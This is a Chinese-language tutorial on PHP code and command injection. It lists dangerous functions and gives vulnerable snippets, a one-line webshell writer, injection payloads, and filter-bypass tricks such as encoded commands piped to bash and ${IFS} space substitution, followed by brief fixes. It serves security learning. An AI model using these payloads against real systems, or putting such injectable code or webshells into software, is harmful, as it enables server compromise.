---
title: 命令注入漏洞
date: 2020-1-22 20:04:00
---
> 代码执行：可执行脚本语言代码
>
> 命令执行：可执行系统(Linux、windows)命令

## PHP敏感函数代码执行

```php
eval()		//把字符串作为PHP代码执行
assert()	//检查一个断言是否为 FALSE，可用来执行代码
preg_replace()	//执行一个正则表达式的搜索和替换
call_user_func()//把第一个参数作为回调函数调用
call_user_func_array()//调用回调函数，并把一个数组参数作为回调函数的参数
array_map()		//为数组的每个元素应用回调函数 
```

**eval：**

```php
<?php @eval($_POST["arg"])?>
```

eval函数会将提交上来的值作为PHP代码处理，可以提交phpinfo(); 或者生成一句话shell

```php
fputs(fopen('shell.php','w+'),'<?php @eval($_POST[pass])?>');
```

**preg_replace：(5.5版本以上已废弃/e修饰符)**

```php
<?php preg_replace("//e",$_GET['arg'],"start testing...");?>
```

当replacement 参数构成一个合理的php代码字符串的时候，/e 修正符将参数当做php代码执行

**create_function:**

```php
<?php $test=$_GET["test"];$new_func=create_function('$a,$b', $test);$new_func(2,M_E);?>
```

在php 中使用create_function创建一个匿名函数（lambda-style） 如未对参数进行严格的过滤审查，可以通过提交特殊字符串给create_function执行任意代码.

**使用`${${ }}`简单绕过：**

```php
<?php $str="echo \"Hello ".$_GET["arg"]."!!\"; ";eval($str);?>
```

代码使用反斜杠将echo后面的内容给转义了 与加addslashes()函数进行过滤是一样的 payload：`arg=${${phpinfo()}}`

## [PHP程序执行函数](https://www.php.net/manual/zh/ref.exec.php) 

```php
system()		//执行外部程序，并且显示输出
exec()			//执行一个外部程序
shell_exec()	//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回
passthru()		//执行外部程序并且显示原始输出
pcntl_exec()	//在当前进程空间执行指定程序
popen()			//打开进程文件指针
proc_open()		//执行一个命令，并且打开用来输入/输出的文件指针
```

最简单的例子：

```
<?php $test = $_GET['cmd']; system($test); ?>
```

payload：`?cmd=whoami`  这样即可执行系统命令

**举一个类似DVWA里边的例子：**

```
<?php$test = $_GET['cmd'];system("ping -c 3 " . $test);?>
```

payload：`?cmd=127.0.0.1;whoami`

**命令分隔符：**

**在Linux上**，上面的 ; 也可以用 |、|| 代替

> ;前面的执行完执行后面的
>
> |是管道符，显示后面的执行结果
>
> ||当前面的执行出错时执行后面的
>
> 可用**%0A**换行执行命令



**在Windows上**，不能用 ; 可以用&、&&、|、||代替

>  &前面的语句为假则直接执行后面的
>
>  &&前面的语句为假则直接出错，后面的也不执行
>
>  |直接执行后面的语句
>
> ||前面出错执行后面的

PHP 支持一个执行运算符：反引号（``） PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回

```php
 <?php echo `whoami`;?>
```

效果与函数 shell_exec() 相同，都是以字符串的形式返回一个命令的执行结果，可以保存到变量中

## 命令执行绕过技巧

**正则审查**

> 是否使用多行模式修饰符（/foo/m）
>
> 是否遗漏匹配对象末尾的换行符（/^\d+$/）
>
> 是否允许空白字符（\s）
>
> 是否误写反斜杠匹配模式（/\\/） 

可用**%0A**换行执行命令，换行符自身是一个有效的**目录分隔符** 

```bash
cat 123/flag
cat 123%0A flag
```

**黑名单绕过**

```php
<?php
$test = $_GET['cmd'];
$test = str_replace("cat", "", $test);
$test = str_replace("ls", "", $test);
$test = str_replace(" ", "", $test);
$test = str_replace("pwd", "", $test);
$test = str_replace("wget", "", $test);
var_dump($test);
system("ls -al '$test'");
?>
```

**shell特殊变量：**ca$1t、ca$@t fla$@g 

**单引号、双引号：** c""at、ca''t、**反斜线** c\at

**base64编码：**`echo "Y2F0IGZsYWc="|base64 -d|bash`、**Hex编码：** echo "63617420666c6167" | xxd -r -p|bash 

**利用变量：** 执行ls命令： a=l;b=s;$a$b	**cat 1.php文件内容：** a=c;b=at;c=1.php;$a$b ${c}



**绕过空格** 

> 用**${IFS}**代替
>
> 读取文件的时候利用重**定向符cat<flag**
>
> 花括号无空格**{cat,666.txt}** 

`$IFS`可截断后边的内容，`cat flag$IFS666.txt`

**长度限制**，通过构造文件来绕过

> linux下可以用 1>a创建文件名为a的空文件
> `ls -t>test`则会将目录按时间排序后写进test文件中
> sh命令可以从一个文件中读取命令来执行

**引号逃逸**

恶意命令被扩在引号内，可用 \ 转义引号逃逸

## 修复方式

> 1、尽量不要使用以上的代码/命令执行函数
>
> 2、使用disable_funtion()禁用以上函数
>
> 3、过滤所有能当作命令分隔符使用的字符

